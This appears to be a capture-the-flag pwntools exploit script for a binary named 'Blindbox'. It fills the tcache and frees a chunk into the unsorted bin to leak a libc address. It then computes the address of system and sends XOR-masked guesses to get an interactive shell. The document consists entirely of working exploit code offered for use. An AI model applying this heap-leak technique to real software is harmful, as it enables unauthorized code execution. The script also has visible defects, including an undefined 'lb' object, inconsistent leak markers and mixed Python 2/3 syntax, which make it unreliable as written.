#coding=utf-8
from pwn import *
from ctypes import cdll

context(arch="amd64", os="linux")
context.log_level='debug'
context.terminal=['tmux','splitw','-h']

ip = ''
port = ''
reomote_addr = [ip,port]
binary = './Blindbox'

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF(binary)
if len(sys.argv)==1:
    p = process(binary)
 
if len(sys.argv)==2 :
    p = remote(reomote_addr[0],reomote_addr[1])

#----------------------------------------------------------------------
ru = lambda x : p.recvuntil(x,timeout=0.2)
sd = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
it = lambda :p.interactive()
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,b'\x00'))
rv6 = lambda : u64(rv(6)+b'\x00'*2)
lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
bp = lambda src=None : attach(p,src)
sym = lambda name : libc.sym[name]
#----------------------------------------------------------------------

def leak(offset):
	addr = u64(p.recvuntil('\x7e')[-6:].ljust(8,'\x00'))
	base = addr - offset
	print "[+]libc_base=>"+hex(base)
	return base

def init():
	sla(" name:\n", "Ev3rGl0w")
	sla("number?\n", str(0x100))
	sla("number?\n", str(0x100))
	sla("number?\n", str(0x100))

def menu(idx):
	ru('>> ')
	sl(str(idx))

def choose(idx1,idx2):
	menu(1)
	menu(str(idx1))
	sla("Give index for this Blindbox(1-3): \n",str(idx2))

def free(idx):
	menu(2)
	sla("Which index do you want to drop?\n",str(idx))

def show(idx):
	menu(3)
	sla("Which Blindbox do you want to open?\n",str(idx))

def shell():
	menu(6)

def malloc(idx):
	menu(5)

init()
for i in range(7):
	choose(1,1)
	free(1)

choose(1,1)
choose(1,2) #protect
free(1)

show(1)
offset = 96+libc.sym['__malloc_hook']+0x10
libc_base = leak(offset)

system_addr = libc_base+libc.sym['system'] 

shell()
for i in range(8):
	number = system_addr ^ lb.rand()
	sla("Please guess>", str(number))
it()